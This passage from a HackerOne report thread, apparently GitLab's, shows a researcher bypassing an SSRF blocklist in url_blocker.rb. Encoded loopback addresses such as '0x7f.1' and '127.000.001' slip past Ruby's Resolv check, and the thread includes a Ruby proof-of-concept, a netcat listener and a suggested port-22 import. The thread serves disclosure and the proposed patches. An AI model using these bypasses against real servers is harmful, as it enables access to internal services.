<span class=\"k\">if</span> <span class=\"n\">blocked_user_or_hostname?</span><span class=\"p\">(</span><span class=\"n\">uri</span><span class=\"p\">.</span><span class=\"nf\">user</span><span class=\"p\">)</span>\n         <span class=\"k\">return</span> <span class=\"kp\">true</span> <span class=\"k\">if</span> <span class=\"n\">blocked_user_or_hostname?</span><span class=\"p\">(</span><span class=\"n\">uri</span><span class=\"p\">.</span><span class=\"nf\">hostname</span><span class=\"p\">)</span>\n\n         <span class=\"n\">server_ips</span> <span class=\"o\">=</span> <span class=\"no\">Resolv</span><span class=\"p\">.</span><span class=\"nf\">getaddresses</span><span class=\"p\">(</span><span class=\"n\">uri</span><span class=\"p\">.</span><span class=\"nf\">hostname</span><span class=\"p\">)</span>\n         <span class=\"k\">return</span> <span class=\"kp\">true</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">blocked_ips</span> <span class=\"o\">&amp;</span> <span class=\"n\">server_ips</span><span class=\"p\">).</span><span class=\"nf\">any?</span>\n       <span class=\"k\">rescue</span> <span class=\"no\">Addressable</span><span class=\"o\">::</span><span class=\"no\">URI</span><span class=\"o\">::</span><span class=\"no\">InvalidURIError</span>\n         <span class=\"k\">return</span> <span class=\"kp\">true</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p>Here you are relying on Ruby&#39;s native resolver:</p>\n<pre class=\"highlight ruby\"><code><span class=\"n\">server_ips</span> <span class=\"o\">=</span> <span class=\"no\">Resolv</span><span class=\"p\">.</span><span class=\"nf\">getaddresses</span><span class=\"p\">(</span><span class=\"n\">uri</span><span class=\"p\">.</span><span class=\"nf\">hostname</span><span class=\"p\">)</span>\n</code></pre>\n<p>We can replicate this on my machine:</p>\n<pre class=\"highlight plaintext\"><code>irb(main):001:0&gt; require &#39;resolv&#39;\n=&gt; true\nirb(main):002:0&gt; uri = &quot;0x7f.1&quot;\n=&gt; &quot;0x7f.1&quot;\nirb(main):003:0&gt; server_ips = Resolv.getaddresses(uri)\n=&gt; []\nirb(main):004:0&gt; blocked_ips = [&quot;127.0.0.1&quot;, &quot;::1&quot;, &quot;0.0.0.0&quot;]\n=&gt; [&quot;127.0.0.1&quot;, &quot;::1&quot;, &quot;0.0.0.0&quot;]\nirb(main):005:0&gt; return true if (blocked_ips &amp; server_ips).any?\n=&gt; nil\n</code></pre>\n<h1 id=\"the-bug\">The Bug</h1>\n\n<p>While playing around with different machines running Ubuntu, I noticed the following strange behaviour by Ruby&#39;s native resolver.</p>\n\n<table>\n<thead>\n<tr>\n<th>\ud83d\udcbb Machine 1</th>\n<th>\ud83d\udcbb Machine 2</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>ruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]</code></td>\n<td><code>ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]</code></td>\n</tr>\n</tbody>\n</table>\n\n<p>1) <strong>\ud83d\udcbb Machine 1</strong>:</p>\n<pre class=\"highlight plaintext\"><code>irb(main):001:0&gt; require &#39;resolv&#39;\n=&gt; true\nirb(main):002:0&gt; uri = &quot;0x7f.1&quot;\n=&gt; &quot;0x7f.1&quot;\nirb(main):003:0&gt; server_ips = Resolv.getaddresses(uri)\n=&gt; []\nirb(main):004:0&gt; blocked_ips = [&quot;127.0.0.1&quot;, &quot;::1&quot;, &quot;0.0.0.0&quot;]\n=&gt; [&quot;127.0.0.1&quot;, &quot;::1&quot;, &quot;0.0.0.0&quot;]\nirb(main):005:0&gt; return true if (blocked_ips &amp; server_ips).any?\n=&gt; nil\n</code></pre>\n<p>2) <strong>\ud83d\udcbb Machine 2</strong></p>\n<pre class=\"highlight plaintext\"><code>irb(main):008:0&gt; Resolv.getaddresses(&quot;127.0.0.1&quot;)\n=&gt; [&quot;127.0.0.1&quot;]\nirb(main):009:0&gt; Resolv.getaddresses(&quot;localhost&quot;)\n=&gt; [&quot;127.0.0.1&quot;]\nirb(main):010:0&gt; Resolv.getaddresses(&quot;127.000.000.1&quot;)\n=&gt; []\n</code></pre>\n<p>3) <strong>\ud83d\udcbb Machine 1</strong></p>\n<pre class=\"highlight plaintext\"><code>irb(main):002:0&gt; Resolv.getaddresses(&quot;127.000.000.1&quot;)\n=&gt; [&quot;127.0.0.1&quot;]\n</code></pre>\n<p>This clears most things up for me now. It was probably difficult to replicate this issue, because it depends on the machine/OS you are running <code>Resolv</code> on. This also explains the unusual delay times and loops for certain payloads.</p>\n\n<p>I will investigate this further and maybe contact the Ruby developers to see what they have to say.</p>\n\n<hr>\n\n<p>Concerning you last statement:</p>\n\n<blockquote>\n<p>Since we have no easy way to determine for sure what strings every OS will translate automatically it&#39;s safer to simply deny connections to hosts without DNS entries altogether.</p>\n</blockquote>\n\n<p>I would suggest using <code>Socket.getaddrinfo()</code> in order to determine what the OS thinks the address is and then perform the other tasks in <code>url_blocker.rb</code>.</p>\n<pre class=\"highlight plaintext\"><code>irb(main):001:0&gt; require &#39;socket&#39;\n=&gt; true\nirb(main):002:0&gt; Socket.getaddrinfo(&quot;0x7f.1&quot;, nil)\n=&gt; [[&quot;AF_INET&quot;, 0, &quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, 2, 1, 6], [&quot;AF_INET&quot;, 0, &quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, 2, 2, 17], [&quot;AF_INET&quot;, 0, &quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, 2, 3, 0]]\nirb(main):003:0&gt; Socket.getaddrinfo(&quot;0177.1&quot;, nil)\n=&gt; [[&quot;AF_INET&quot;, 0, &quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, 2, 1, 6], [&quot;AF_INET&quot;, 0, &quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, 2, 2, 17], [&quot;AF_INET&quot;, 0, &quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, 2, 3, 0]]\nirb(main):004:0&gt; Socket.getaddrinfo(&quot;2130706433&quot;, nil)\n=&gt; [[&quot;AF_INET&quot;, 0, &quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, 2, 1, 6], [&quot;AF_INET&quot;, 0, &quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, 2, 2, 17], [&quot;AF_INET&quot;, 0, &quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, 2, 3, 0]]\n</code></pre>\n<hr>\n\n<p>Also just to add to the list of bypasses, here is another one that actually resolves using Ruby&#39;s Resolv on <strong>\ud83d\udcbb Machine 1</strong>, but completely bypasses your exclusion list:</p>\n<pre class=\"highlight plaintext\"><code>irb(main):001:0&gt; require &#39;resolv&#39;\n=&gt; true\nirb(main):002:0&gt; Resolv.getaddress &quot;127.000.000.001&quot;\n=&gt; &quot;127.0.0.1&quot;\n</code></pre>\n<p>You can verify this by importing <code>http://127.000.000.001:22/</code>.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2131216, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/236/086/a9b56b40d81daa44affb3310a5e0f766ed26ae13/poc.rb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223006Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c1eae04625261d0ff19848f5e7c108d94f8f229de0addfa02167ecd1bd688a80", 
+                    "type": "text/plain", 
+                    "id": 236086, 
+                    "filename": "poc.rb"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-11-03T13:12:59.103Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-03T13:12:59.103Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Here is a simplified proof of concept:\n\n```\n$ ruby -v\nruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]\n$ irb\nirb(main):001:0> require 'resolv'\n=> true\nirb(main):002:0> uri = \"0x7f.1\"\n=> \"0x7f.1\"\nirb(main):003:0> server_ips = Resolv.getaddresses(uri)\n=> []\nirb(main):004:0> blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n=> [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\nirb(main):005:0> (blocked_ips & server_ips).any?\n=> false\nirb(main):006:0> uri = \"127.000.001\"\n=> \"127.000.001\"\nirb(main):007:0> server_ips = Resolv.getaddresses(uri)\n=> []\nirb(main):008:0> blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n=> [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\nirb(main):009:0> (blocked_ips & server_ips).any?\n=> false\n```\n\nHere is a proof of concept that demonstrates the dangers of relying on Ruby's native resolver for security-related features.\n\n1) Fire up a listener in one tab:\n\n```\n$ echo -e \"HTTP/1.1 200 OK\\n\\nHello from netcat :)\" | sudo nc -l 80\n```\n\n2) Run {F236086}:\n\n```\n$ cat poc.rb\nrequire 'resolv'\nrequire 'uri'\nrequire 'net/http'\n\nputs \"IP to test:\"\nhost = gets.strip\n\naddrs = Resolv.getaddresses(host)\nputs \"Result of Resolv.getaddresses():\"\nputs addrs\nputs \"(#{addrs.length} address(es))\"\n\nuri = URI.parse(\"http://#{host}/\")\nresponse = Net::HTTP.get_response uri\nputs \"Result of fetching http://#{host}/:\"\nputs response.body\n$ ruby poc.rb\nIP to test:\n127.000.001\nResult of Resolv.getaddresses():\n(0 address(es))\nResult of fetching http://127.000.001/:\nHello from netcat :)\n$ ruby poc.rb\nIP to test:\n0x7f.1\nResult of Resolv.getaddresses():\n(0 address(es))\nResult of fetching http://0x7f.1/:\nHello from netcat :)\n```", 
+            "markdown_message": "<p>Here is a simplified proof of concept:</p>\n<pre class=\"highlight plaintext\"><code>$ ruby -v\nruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]\n$ irb\nirb(main):001:0&gt; require &#39;resolv&#39;\n=&gt; true\nirb(main):002:0&gt; uri = &quot;0x7f.1&quot;\n=&gt; &quot;0x7f.1&quot;\nirb(main):003:0&gt; server_ips = Resolv.getaddresses(uri)\n=&gt; []\nirb(main):004:0&gt; blocked_ips = [&quot;127.0.0.1&quot;, &quot;::1&quot;, &quot;0.0.0.0&quot;]\n=&gt; [&quot;127.0.0.1&quot;, &quot;::1&quot;, &quot;0.0.0.0&quot;]\nirb(main):005:0&gt; (blocked_ips &amp; server_ips).any?\n=&gt; false\nirb(main):006:0&gt; uri = &quot;127.000.001&quot;\n=&gt; &quot;127.000.001&quot;\nirb(main):007:0&gt; server_ips = Resolv.getaddresses(uri)\n=&gt; []\nirb(main):008:0&gt; blocked_ips = [&quot;127.0.0.1&quot;, &quot;::1&quot;, &quot;0.0.0.0&quot;]\n=&gt; [&quot;127.0.0.1&quot;, &quot;::1&quot;, &quot;0.0.0.0&quot;]\nirb(main):009:0&gt; (blocked_ips &amp; server_ips).any?\n=&gt; false\n</code></pre>\n<p>Here is a proof of concept that demonstrates the dangers of relying on Ruby&#39;s native resolver for security-related features.</p>\n\n<p>1) Fire up a listener in one tab:</p>\n<pre class=\"highlight plaintext\"><code>$ echo -e &quot;HTTP/1.1 200 OK\\n\\nHello from netcat :)&quot; | sudo nc -l 80\n</code></pre>\n<p>2) Run <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"poc.rb\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/236/086/a9b56b40d81daa44affb3310a5e0f766ed26ae13/poc.rb?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223006Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=c1eae04625261d0ff19848f5e7c108d94f8f229de0addfa02167ecd1bd688a80\" data-attachment-type=\"text/plain\">poc.rb (F236086)</a>:</p>\n<pre class=\"highlight plaintext\"><code>$ cat poc.rb\nrequire &#39;resolv&#39;\nrequire &#39;uri&#39;\nrequire &#39;net/http&#39;\n\nputs &quot;IP to test:&quot;\nhost = gets.strip\n\naddrs = Resolv.getaddresses(host)\nputs &quot;Result of Resolv.getaddresses():&quot;\nputs addrs\nputs &quot;(#{addrs.length} address(es))&quot;\n\nuri = URI.parse(&quot;http://#{host}/&quot;)\nresponse = Net::HTTP.get_response uri\nputs &quot;Result of fetching http://#{host}/:&quot;\nputs response.body\n$ ruby poc.rb\nIP to test:\n127.000.001\nResult of Resolv.getaddresses():\n(0 address(es))\nResult of fetching http://127.000.001/:\nHello from netcat :)\n$ ruby poc.rb\nIP to test:\n0x7f.1\nResult of Resolv.getaddresses():\n(0 address(es))\nResult of fetching http://0x7f.1/:\nHello from netcat :)\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 2131402, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-03T13:17:49.537Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-03T13:17:49.537Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "> It was probably difficult to replicate this issue, because it depends on the machine/OS you are running `Resolv` on.\n\nThe output from your very first response:\n\n```\nirb(main):010:0> uri.hostname\n=> \"0x7f.1\"\nirb(main):011:0> ips = Resolv.getaddresses(uri.hostname)\n=> [\"127.0.0.1\"]\n```\n\nThe output on my machine (**\ud83d\udcbb Machine 1**):\n\n```\nirb(main):001:0> require 'resolv'\n=> true\nirb(main):002:0> uri = \"0x7f.1\"\n=> \"0x7f.1\"\nirb(main):003:0> ips = Resolv.getaddresses(uri)\n=> []\n```", 
+            "markdown_message": "<blockquote>\n<p>It was probably difficult to replicate this issue, because it depends on the machine/OS you are running <code>Resolv</code> on.</p>\n</blockquote>\n\n<p>The output from your very first response:</p>\n<pre class=\"highlight plaintext\"><code>irb(main):010:0&gt; uri.hostname\n=&gt; &quot;0x7f.1&quot;\nirb(main):011:0&gt; ips = Resolv.getaddresses(uri.hostname)\n=&gt; [&quot;127.0.0.1&quot;]\n</code></pre>\n<p>The output on my machine (<strong>\ud83d\udcbb Machine 1</strong>):</p>\n<pre class=\"highlight plaintext\"><code>irb(main):001:0&gt; require &#39;resolv&#39;\n=&gt; true\nirb(main):002:0&gt; uri = &quot;0x7f.1&quot;\n=&gt; &quot;0x7f.1&quot;\nirb(main):003:0&gt; ips = Resolv.getaddresses(uri)\n=&gt; []\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 2131429, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/236/113/a972f7804f3f58a2520f1d696f6f27f94b6129ec/url_blocker.rb.patch?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223006Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2da9b284d97cf55c16bc392560c0b7f8e7ea278bc20d85a1927ffbfca07a90d4", 
+                    "type": "text/x-ruby", 
+                    "id": 236113, 
+                    "filename": "url_blocker.rb.patch"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-11-03T14:40:07.525Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-03T14:40:07.525Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Here is a full patch that should prevent this issue altogether: {F236113}. Please verify that you are not relying on `Resolv.getaddresses()` anywhere else in your codebase. That function is completely broken and should never be used for security-related features.\n\nHere is the snippet of code responsible for forwarding the address on to the OS in `lib/resolv.rb`:\n\n```ruby\nbegin\n  raise LoadError unless /mswin|mingw|cygwin/ =~ RUBY_PLATFORM\n  require 'win32/resolv'\n  DefaultFileName = Win32::Resolv.get_hosts_path\nrescue LoadError\n  DefaultFileName = '/etc/hosts'\nend\n```\n\nLink to source code: https://github.com/ruby/ruby/blob/trunk/lib/resolv.rb#L169-L175\n\nI have not had a chance to discuss this with the Ruby Core development team yet.", 
+            "markdown_message": "<p>Here is a full patch that should prevent this issue altogether: <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"url_blocker.rb.patch\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/236/113/a972f7804f3f58a2520f1d696f6f27f94b6129ec/url_blocker.rb.patch?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223006Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=2da9b284d97cf55c16bc392560c0b7f8e7ea278bc20d85a1927ffbfca07a90d4\" data-attachment-type=\"text/x-ruby\">url_blocker.rb.patch (F236113)</a>. Please verify that you are not relying on <code>Resolv.getaddresses()</code> anywhere else in your codebase. That function is completely broken and should never be used for security-related features.</p>\n\n<p>Here is the snippet of code responsible for forwarding the address on to the OS in <code>lib/resolv.rb</code>:</p>\n<pre class=\"highlight ruby\"><code><span class=\"k\">begin</span>\n  <span class=\"k\">raise</span> <span class=\"no\">LoadError</span> <span class=\"k\">unless</span> <span class=\"sr\">/mswin|mingw|cygwin/</span> <span class=\"o\">=~</span> <span class=\"no\">RUBY_PLATFORM</span>\n  <span class=\"nb\">require</span> <span class=\"s1\">&#39;win32/resolv&#39;</span>\n  <span class=\"no\">DefaultFileName</span> <span class=\"o\">=</span> <span class=\"no\">Win32</span><span class=\"o\">::</span><span class=\"no\">Resolv</span><span class=\"p\">.</span><span class=\"nf\">get_hosts_path</span>\n<span class=\"k\">rescue</span> <span class=\"no\">LoadError</span>\n  <span class=\"no\">DefaultFileName</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;/etc/hosts&#39;</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p>Link to source code: <a title=\"https://github.com/ruby/ruby/blob/trunk/lib/resolv.rb#L169-L175\" href=\"/redirect?signature=e64f34521c9c62cd2745bd27869500a1462c389e&amp;url=https%3A%2F%2Fgithub.com%2Fruby%2Fruby%2Fblob%2Ftrunk%2Flib%2Fresolv.rb%23L169-L175\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/ruby/ruby/blob/trunk/lib/resolv.rb#L169-L175</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>I have not had a chance to discuss this with the Ruby Core development team yet.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2131876, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/236/128/1f98d265187089a4682805bd261b282d3c023b45/url_blocker.rb.patch?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223006Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3e49ea5fcbbb5ded7a8a1ef823a4cbab04d9c4a5b65de7c5fe01afcb1dd35cba", 
+                    "type": "text/x-ruby", 
+                    "id": 236128, 
+                    "filename": "url_blocker.rb.patch"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-11-03T15:09:09.034Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-03T15:09:09.034Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Actually, there is no need to expand the blacklist. Here is the updated patch: {F236128}.", 
+            "markdown_message": "<p>Actually, there is no need to expand the blacklist. Here is the updated patch: <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"url_blocker.rb.patch\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/236/128/1f98d265187089a4682805bd261b282d3c023b45/url_blocker.rb.patch?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223006Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEy